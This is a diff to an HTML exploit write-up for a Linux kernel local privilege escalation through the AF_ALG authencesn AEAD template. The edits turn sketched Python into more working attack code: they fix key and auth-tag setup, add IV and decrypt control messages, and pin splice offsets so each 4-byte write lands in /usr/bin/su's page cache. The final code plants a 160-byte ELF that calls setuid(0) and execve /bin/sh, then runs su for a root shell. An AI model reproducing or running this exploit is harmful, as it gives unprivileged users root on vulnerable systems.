@@ -471,7 +471,7 @@ footer p{font-size:.72rem;color:var(--text3);}
         <div class="step-num">2</div>
         <div class="step-body">
           <h4>Bind to the authencesn AEAD template</h4>
-          <p>Bind the socket to <span class="ic">aead / authencesn(hmac(sha256),cbc(aes))</span>. Set the AEAD key via <span class="ic">setsockopt()</span> using authencesn's rtattr format (4-byte rtattr header + 4-byte enckeylen + 32-byte HMAC key + 16-byte AES key), then call <span class="ic">accept()</span> to get an operational crypto file descriptor.</p>
+          <p>Bind the socket to <span class="ic">aead / authencesn(hmac(sha256),cbc(aes))</span>. Set the AEAD key via <span class="ic">setsockopt(SOL_ALG, ALG_SET_KEY)</span> using authencesn's rtattr format (4-byte rtattr header + 4-byte enckeylen + 16-byte HMAC key + 16-byte AES key). Set the auth tag size to 4 bytes via <span class="ic">setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)</span> - this must be called before <span class="ic">accept()</span> or subsequent <span class="ic">sendmsg</span> calls return <span class="ic">EINVAL</span>. Finally call <span class="ic">accept()</span> to get an operational crypto file descriptor. A fresh socket is created for each 4-byte write to avoid stale state after the expected auth failure.</p>
         </div>
       </div>
       <div class="step-card">
@@ -499,7 +499,7 @@ footer p{font-size:.72rem;color:var(--text3);}
         <div class="step-num">6</div>
         <div class="step-body">
           <h4>Repeat for every 4-byte chunk of the ELF payload</h4>
-          <p>Loop through every 4 bytes of the 160-byte ELF payload, writing chunk by chunk starting at offset 0. Each iteration modifies exactly 4 bytes of <span class="ic">/usr/bin/su</span>'s in-RAM copy. The script adjusts the AEAD length parameters each iteration to advance the write pointer.</p>
+          <p>Loop through every 4 bytes of the 160-byte ELF payload, writing chunk by chunk starting at offset 0. <span class="ic">cryptlen = target_offset</span> grows by 4 each iteration; because <span class="ic">splice(..., offset_src=0)</span> always reads from the start of the file, byte <span class="ic">cryptlen</span> of the spliced data maps exactly to file byte <span class="ic">target_offset</span>. Each iteration modifies exactly 4 bytes of <span class="ic">/usr/bin/su</span>'s in-RAM copy.</p>
         </div>
       </div>
       <div class="step-card">
@@ -617,7 +617,7 @@ footer p{font-size:.72rem;color:var(--text3);}
 
     <div class="subsection">
       <h3 class="subsection-heading">Setting Up the AF_ALG Socket</h3>
-      <p>The exploit begins by creating the AF_ALG socket and binding it to the vulnerable AEAD template. This is the only setup needed - no root, no special files, no kernel modules to load manually:</p>
+      <p>The exploit begins by creating the AF_ALG socket, binding it to the vulnerable AEAD template, and configuring the auth tag size. No root required, no special files, no manual module loading:</p>
 
       <div class="code-block">
         <div class="cb-header"><span class="cb-lang">Python</span><span class="cb-file">exploit setup</span></div>
@@ -637,12 +637,13 @@ sock.<span class="hl-fn">bind</span>((
 <span class="hl-cm"># Step 3: set the AEAD key - authencesn requires rtattr-formatted key:</span>
 <span class="hl-cm">#   [rtattr hdr: rta_len=8, rta_type=1 (4B)] [enckeylen big-endian (4B)]</span>
 <span class="hl-cm">#   [HMAC-SHA256 auth key (32B)] [AES-128 enc key (16B)]</span>
-enc_key  = <span class="hl-str">b'\x00'</span> * <span class="hl-num">16</span>   <span class="hl-cm"># AES-128 encryption key</span>
-auth_key = <span class="hl-str">b'\x00'</span> * <span class="hl-num">32</span>   <span class="hl-cm"># HMAC-SHA256 authentication key</span>
-aead_key = (struct.<span class="hl-fn">pack</span>(<span class="hl-str">'&lt;HH'</span>, <span class="hl-num">8</span>, <span class="hl-num">1</span>) +
-            struct.<span class="hl-fn">pack</span>(<span class="hl-str">'&gt;I'</span>, <span class="hl-fn">len</span>(enc_key)) +
-            auth_key + enc_key)
+enc_key  = <span class="hl-str">b'\x00'</span> * <span class="hl-num">16</span>   <span class="hl-cm"># AES-128 encryption key (16 bytes)</span>
+auth_key = <span class="hl-str">b'\x00'</span> * <span class="hl-num">16</span>   <span class="hl-cm"># HMAC-SHA256 authentication key (16 bytes)</span>
+aead_key = (struct.<span class="hl-fn">pack</span>(<span class="hl-str">'&lt;HH'</span>, <span class="hl-num">8</span>, <span class="hl-num">1</span>) +   <span class="hl-cm"># rtattr: rta_len=8, rta_type=1</span>
+            struct.<span class="hl-fn">pack</span>(<span class="hl-str">'&gt;I'</span>, <span class="hl-fn">len</span>(enc_key)) +  <span class="hl-cm"># enckeylen=16 big-endian</span>
+            auth_key + enc_key)              <span class="hl-cm"># 16B auth key + 16B enc key</span>
 sock.<span class="hl-fn">setsockopt</span>(<span class="hl-num">279</span>, <span class="hl-num">1</span>, aead_key)   <span class="hl-cm"># SOL_ALG=279, ALG_SET_KEY=1</span>
+sock.<span class="hl-fn">setsockopt</span>(<span class="hl-num">279</span>, <span class="hl-num">5</span>, <span class="hl-kw">None</span>, <span class="hl-num">4</span>)     <span class="hl-cm"># ALG_SET_AEAD_AUTHSIZE=5 on this kernel, authsize=4 bytes</span>
 
 <span class="hl-cm"># Step 4: accept() returns the operational crypto fd</span>
 op_fd, _ = sock.<span class="hl-fn">accept</span>()</code></pre>
@@ -651,14 +652,14 @@ op_fd, _ = sock.<span class="hl-fn">accept</span>()</code></pre>
 
     <div class="subsection">
       <h3 class="subsection-heading">The Write Primitive - Corrupting Page Cache</h3>
-      <p>The core of the exploit: for each 4-byte chunk to write, the function first sends the 8-byte AAD (bytes 4-7 = <span class="ic">seqno_lo</span> = the value we want written) via <span class="ic">sendmsg(MSG_MORE)</span> to buffer it, then splices the target file's page cache pages into the AF_ALG socket, then calls <span class="ic">recv()</span> to trigger the AEAD operation:</p>
+      <p>The core of the exploit: for each 4-byte chunk to write, a fresh AF_ALG socket is created (bind, key, authsize, accept) - one per write to avoid any stale state. Then the function sends the 8-byte AAD (bytes 4-7 = <span class="ic">seqno_lo</span> = the value we want written) via <span class="ic">sendmsg(MSG_MORE)</span>, splices the target file's page cache pages into the socket, and calls <span class="ic">recv()</span> to trigger the AEAD operation:</p>
 
       <div class="code-block">
         <div class="cb-header"><span class="cb-lang">Python</span><span class="cb-file">4-byte write primitive</span></div>
         <pre><code><span class="hl-kw">def</span> <span class="hl-fn">write_4bytes</span>(op_fd, target_path, target_offset, value_bytes):
     <span class="hl-cm"># assoclen=8: 4-byte padding + 4-byte seqno_lo (the value to plant)</span>
     assoclen = <span class="hl-num">8</span>
-    authsize = <span class="hl-num">32</span>                          <span class="hl-cm"># HMAC-SHA256 tag (256-bit)</span>
+    authsize = <span class="hl-num">4</span>                           <span class="hl-cm"># truncated auth tag (set via ALG_SET_AEAD_AUTHSIZE)</span>
     cryptlen = target_offset               <span class="hl-cm"># seqno_lo write lands at byte cryptlen = target_offset</span>
 
     <span class="hl-cm"># Open target file (read permission only needed)</span>
@@ -667,13 +668,18 @@ op_fd, _ = sock.<span class="hl-fn">accept</span>()</code></pre>
 
     <span class="hl-cm"># Step 1: sendmsg FIRST with MSG_MORE - buffers the 8-byte AAD, does not flush yet</span>
     <span class="hl-cm"># bytes 4-7 = seqno_lo = the 4 bytes authencesn will write into the page cache</span>
-    aad = <span class="hl-str">b'\x00'</span> * <span class="hl-num">4</span> + value_bytes          <span class="hl-cm"># 8-byte AAD</span>
+    aad = <span class="hl-str">b'A'</span> * <span class="hl-num">4</span> + value_bytes              <span class="hl-cm"># 8-byte AAD: 4-byte padding + 4-byte seqno_lo value</span>
     op_fd.<span class="hl-fn">sendmsg</span>([aad],
-        [(socket.SOL_ALG, <span class="hl-num">4</span>, assoclen.<span class="hl-fn">to_bytes</span>(<span class="hl-num">4</span>, <span class="hl-str">'little'</span>))],
+        [
+            (socket.SOL_ALG, <span class="hl-num">3</span>, (<span class="hl-num">0</span>).<span class="hl-fn">to_bytes</span>(<span class="hl-num">4</span>, <span class="hl-str">'little'</span>)),            <span class="hl-cm"># ALG_SET_OP=3: decrypt</span>
+            (socket.SOL_ALG, <span class="hl-num">2</span>, struct.<span class="hl-fn">pack</span>(<span class="hl-str">'&lt;I'</span>, <span class="hl-num">16</span>) + <span class="hl-str">b'\x00'</span> * <span class="hl-num">16</span>), <span class="hl-cm"># ALG_SET_IV=2: zero AES-CBC IV</span>
+            (socket.SOL_ALG, <span class="hl-num">4</span>, assoclen.<span class="hl-fn">to_bytes</span>(<span class="hl-num">4</span>, <span class="hl-str">'little'</span>)),      <span class="hl-cm"># ALG_SET_AEAD_ASSOCLEN=4</span>
+        ],
         socket.MSG_MORE)                             <span class="hl-cm"># more data coming via splice</span>
 
     <span class="hl-cm"># Step 2: splice() file pages into pipe (zero copy - actual page cache refs)</span>
-    os.<span class="hl-fn">splice</span>(target_fd, pipe_w, cryptlen + authsize)
+    <span class="hl-cm"># offset_src=0: always read from the beginning of the file (not sequential)</span>
+    os.<span class="hl-fn">splice</span>(target_fd, pipe_w, cryptlen + authsize, offset_src=<span class="hl-num">0</span>)
 
     <span class="hl-cm"># Step 3: splice() pipe into AF_ALG (page cache pages enter AEAD scatterlist)</span>
     os.<span class="hl-fn">splice</span>(pipe_r, op_fd.<span class="hl-fn">fileno</span>(), cryptlen + authsize)
@@ -683,7 +689,7 @@ op_fd, _ = sock.<span class="hl-fn">accept</span>()</code></pre>
     <span class="hl-cm"># cryptlen (= target_offset) into the page cache</span>
     <span class="hl-cm"># BEFORE HMAC is verified - the write is never rolled back</span>
     <span class="hl-kw">try</span>:
-        op_fd.<span class="hl-fn">recv</span>(<span class="hl-num">4096</span>)
+        op_fd.<span class="hl-fn">recv</span>(assoclen + cryptlen)
     <span class="hl-kw">except</span> OSError:
         <span class="hl-kw">pass</span>   <span class="hl-cm"># EBADMSG - HMAC fails as expected, page cache already written</span>
 
@@ -698,34 +704,34 @@ op_fd, _ = sock.<span class="hl-fn">accept</span>()</code></pre>
 
     <div class="subsection">
       <h3 class="subsection-heading">Injecting the ELF Payload and Getting Root</h3>
-      <p>With the 4-byte write primitive, the exploit writes a complete minimal ELF64 binary into <span class="ic">/usr/bin/su</span>'s page cache starting from byte 0 - replacing the ELF magic bytes, headers, and code entirely. The payload is a self-contained 160-byte ELF: a 64-byte ELF header, a single 56-byte PT_LOAD program header, and 40 bytes of x86-64 shellcode that calls <span class="ic">setuid(0)</span> then <span class="ic">execve("/bin/sh", ...)</span>.</p>
+      <p>With the 4-byte write primitive, the exploit writes a complete minimal ELF64 binary into <span class="ic">/usr/bin/su</span>'s page cache starting from byte 0 - replacing the ELF magic bytes, headers, and code entirely. The payload is a self-contained 160-byte ELF: a 64-byte ELF header, a single 56-byte PT_LOAD program header, and 40 bytes of x86-64 shellcode that calls <span class="ic">setuid(0)</span> then <span class="ic">execve("/bin/sh", ...)</span>. It is embedded in the exploit compressed with zlib and decompressed at runtime.</p>
 
       <div class="callout callout-info">
         <strong>Why Writing from Offset 0 Works</strong>
-        The first iteration writes at <span class="ic">target_offset = 0</span>, which means <span class="ic">cryptlen = 0</span>. You might expect AES-CBC to reject this because it requires a full 16-byte block. It doesn't matter: authencesn's seqno_lo write is part of its <em>pre-processing phase</em> - it writes into the scatterlist before dispatching to the inner <span class="ic">hmac(sha256)+cbc(aes)</span> transform. Even with <span class="ic">cryptlen = 0</span>, the 4-byte page cache write fires. The subsequent cipher failure (block size mismatch or bad HMAC) comes after - and does not roll back the write.
+        The first iteration writes at <span class="ic">target_offset = 0</span>, which means <span class="ic">cryptlen = 0</span>. You might expect AES-CBC to reject this because it requires a full 16-byte block. It doesn't matter: authencesn's seqno_lo write is part of its <em>pre-processing phase</em> - it writes into the scatterlist before dispatching to the inner <span class="ic">hmac(sha256)+cbc(aes)</span> transform. Even with <span class="ic">cryptlen = 0</span>, the 4-byte page cache write fires. The subsequent cipher failure (block size mismatch or bad HMAC) comes after - and does not roll back the write. Each subsequent iteration increments <span class="ic">cryptlen</span> by 4, and because <span class="ic">splice(..., offset_src=0)</span> always reads from the start of the file, byte <span class="ic">cryptlen</span> of the spliced data maps exactly to file byte <span class="ic">target_offset</span>.
       </div>
 
       <div class="code-block">
-        <div class="cb-header"><span class="cb-lang">Python</span><span class="cb-file">ELF injection and execution (conceptual)</span></div>
-        <pre><code><span class="hl-cm"># ELF_PAYLOAD: a 160-byte self-contained ELF64 binary</span>
+        <div class="cb-header"><span class="cb-lang">Python</span><span class="cb-file">ELF injection and execution</span></div>
+        <pre><code><span class="hl-cm"># ELF_PAYLOAD: 160-byte self-contained ELF64, zlib-compressed in the exploit</span>
 <span class="hl-cm">#   - ELF header (64B): e_entry points into the code section below</span>
 <span class="hl-cm">#   - PT_LOAD (56B):    maps file[0..159] to a fixed virtual address, RWX</span>
 <span class="hl-cm">#   - code (40B):       setuid(0) + execve("/bin/sh", ["/bin/sh", NULL], NULL) + exit(0)</span>
-<span class="hl-cm"># The payload is embedded compressed in the exploit and decompressed at runtime.</span>
-<span class="hl-cm"># cryptlen=0 on the first write is valid - seqno_lo write is pre-cipher in authencesn.</span>
-ELF_PAYLOAD = <span class="hl-str">b'...'</span>   <span class="hl-cm"># 160 bytes</span>
+ELF_PAYLOAD = zlib.<span class="hl-fn">decompress</span>(COMPRESSED_BLOB)   <span class="hl-cm"># 160 bytes after decompression</span>
 
 TARGET = <span class="hl-str">"/usr/bin/su"</span>   <span class="hl-cm"># setuid-root binary, world-readable</span>
+file_fd = os.<span class="hl-fn">open</span>(TARGET, os.O_RDONLY)
 
 <span class="hl-cm"># Overwrite /usr/bin/su's page cache from offset 0 - replaces the entire binary in RAM</span>
-<span class="hl-kw">for</span> i <span class="hl-kw">in</span> <span class="hl-fn">range</span>(<span class="hl-num">0</span>, <span class="hl-fn">len</span>(ELF_PAYLOAD), <span class="hl-num">4</span>):
-    chunk = ELF_PAYLOAD[i:i+<span class="hl-num">4</span>].<span class="hl-fn">ljust</span>(<span class="hl-num">4</span>, <span class="hl-str">b'\x00'</span>)
-    <span class="hl-fn">write_4bytes</span>(op_fd, TARGET, i, chunk)
+<span class="hl-cm"># Each write_4bytes() creates its own fresh AF_ALG socket (bind/key/accept per call)</span>
+i = <span class="hl-num">0</span>
+<span class="hl-kw">while</span> i &lt; <span class="hl-fn">len</span>(ELF_PAYLOAD):
+    <span class="hl-fn">write_4bytes</span>(file_fd, i, ELF_PAYLOAD[i:i+<span class="hl-num">4</span>])
+    i += <span class="hl-num">4</span>
 
-<span class="hl-cm"># execv replaces the current process with su, loaded from the poisoned page cache.</span>
-<span class="hl-cm"># The setuid bit on disk is intact - kernel grants root context before jumping to</span>
-<span class="hl-cm"># our ELF's entry point, which calls setuid(0) then drops a /bin/sh root shell.</span>
-os.<span class="hl-fn">execv</span>(TARGET, [TARGET])</code></pre>
+<span class="hl-cm"># Run su - kernel loads from poisoned page cache, setuid bit intact on disk</span>
+<span class="hl-cm"># Injected ELF calls setuid(0) then execve("/bin/sh") - root shell</span>
+os.<span class="hl-fn">system</span>(<span class="hl-str">"su"</span>)</code></pre>
       </div>
     </div>
 
